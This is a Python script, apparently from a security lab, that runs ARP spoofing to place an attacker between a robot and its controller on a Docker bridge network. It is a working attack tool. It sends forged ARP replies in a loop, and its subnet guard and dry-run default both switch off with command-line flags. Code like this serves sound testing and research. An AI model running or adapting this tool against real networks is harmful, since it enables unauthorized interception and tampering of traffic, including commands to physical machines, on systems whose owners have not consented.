#!/usr/bin/env python3
"""Constrained ARP poisoning helper for the Docker bridge MITM lab.

This script is intentionally constrained to the local lab subnet by default:
172.28.0.0/24. It starts in dry-run mode unless --execute is provided.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import pathlib
import signal
import sys
import time
from dataclasses import asdict, dataclass
from typing import Optional

from scapy.all import ARP, Ether, get_if_hwaddr, send, srp  # type: ignore


LAB_SUBNET = ipaddress.ip_network("172.28.0.0/24")


@dataclass
class Endpoint:
    label: str
    ip: str
    mac: str


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="ARP poisoning helper for the isolated Docker MITM lab",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--iface", default="eth0")
    parser.add_argument("--controller-ip", default="172.28.0.10")
    parser.add_argument("--robot-ip", default="172.28.0.20")
    parser.add_argument("--interval", type=float, default=1.0)
    parser.add_argument("--duration", type=float, default=20.0)
    parser.add_argument("--log-dir", default="/workspace/project/logs/experiments/03_network_mitm")
    parser.add_argument("--execute", action="store_true", help="Actually send ARP replies")
    parser.add_argument("--restore", action="store_true", help="Send restoration ARP replies at exit")
    parser.add_argument(
        "--allow-non-lab-subnet",
        action="store_true",
        help="Disable the 172.28.0.0/24 guard. Do not use outside an approved isolated lab.",
    )
    return parser.parse_args()


def validate_lab_ip(ip_text: str, allow_non_lab: bool) -> None:
    ip = ipaddress.ip_address(ip_text)
    if not allow_non_lab and ip not in LAB_SUBNET:
        raise SystemExit(
            f"Refusing non-lab IP {ip}. This helper defaults to {LAB_SUBNET}; "
            "use --allow-non-lab-subnet only in an approved isolated lab."
        )


def ensure_log_dir(path: pathlib.Path) -> None:
    path.mkdir(parents=True, exist_ok=True)


def log_event(log_path: pathlib.Path, event: dict) -> None:
    with log_path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps({"ts": time.time(), **event}, sort_keys=True) + "\n")


def resolve_mac(ip: str, iface: str) -> Optional[str]:
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered = srp(request, timeout=1.5, retry=1, iface=iface, verbose=False)[0]
    if not answered:
        return None
    return answered[0][1].hwsrc


def poison_once(target: Endpoint, spoof_ip: str, spoof_label: str, iface: str, execute: bool,
                log_path: pathlib.Path) -> None:
    packet = ARP(op=2, pdst=target.ip, hwdst=target.mac, psrc=spoof_ip)
    event = {
        "action": "poison",
        "target": asdict(target),
        "spoof_ip": spoof_ip,
        "spoof_label": spoof_label,
        "execute": execute,
        "packet_summary": packet.summary(),
    }
    log_event(log_path, event)
    print(f"[poison] tell {target.label}({target.ip}) that {spoof_label} is at attacker MAC")
    if execute:
        send(packet, iface=iface, verbose=False)


def restore_once(target: Endpoint, source: Endpoint, iface: str, execute: bool,
                 log_path: pathlib.Path) -> None:
    packet = ARP(op=2, pdst=target.ip, hwdst=target.mac, psrc=source.ip, hwsrc=source.mac)
    event = {
        "action": "restore",
        "target": asdict(target),
        "source": asdict(source),
        "execute": execute,
        "packet_summary": packet.summary(),
    }
    log_event(log_path, event)
    print(f"[restore] tell {target.label}({target.ip}) that {source.label} is {source.mac}")
    if execute:
        send(packet, iface=iface, count=4, inter=0.2, verbose=False)


def main() -> int:
    args = parse_args()
    validate_lab_ip(args.controller_ip, args.allow_non_lab_subnet)
    validate_lab_ip(args.robot_ip, args.allow_non_lab_subnet)

    log_dir = pathlib.Path(args.log_dir)
    ensure_log_dir(log_dir)
    log_path = log_dir / f"arp_poison_{int(time.time())}.jsonl"

    attacker_mac = get_if_hwaddr(args.iface)
    print("=== Docker bridge ARP MITM helper ===")
    print(f"iface:         {args.iface}")
    print(f"attacker MAC:  {attacker_mac}")
    print(f"controller IP: {args.controller_ip}")
    print(f"robot IP:      {args.robot_ip}")
    print(f"execute:       {args.execute}")
    print(f"log:           {log_path}")

    controller_mac = resolve_mac(args.controller_ip, args.iface)
    robot_mac = resolve_mac(args.robot_ip, args.iface)
    if not controller_mac or not robot_mac:
        print("ERROR: failed to resolve controller or robot MAC address", file=sys.stderr)
        print(f"controller_mac={controller_mac} robot_mac={robot_mac}", file=sys.stderr)
        return 2

    controller = Endpoint("controller", args.controller_ip, controller_mac)
    robot = Endpoint("robot", args.robot_ip, robot_mac)
    print(f"controller MAC: {controller.mac}")
    print(f"robot MAC:      {robot.mac}")

    log_event(
        log_path,
        {
            "action": "start",
            "iface": args.iface,
            "attacker_mac": attacker_mac,
            "controller": asdict(controller),
            "robot": asdict(robot),
            "execute": args.execute,
        },
    )

    stop = False

    def handle_signal(signum, _frame):
        nonlocal stop
        print(f"\nreceived signal {signum}; stopping")
        stop = True

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    started = time.time()
    while not stop and time.time() - started < args.duration:
        poison_once(controller, robot.ip, "robot", args.iface, args.execute, log_path)
        poison_once(robot, controller.ip, "controller", args.iface, args.execute, log_path)
        time.sleep(args.interval)

    if args.restore:
        print("restoring ARP mappings")
        restore_once(controller, robot, args.iface, args.execute, log_path)
        restore_once(robot, controller, args.iface, args.execute, log_path)

    log_event(log_path, {"action": "finish", "execute": args.execute})
    print("finished")
    return 0


if __name__ == "__main__":
    sys.exit(main())
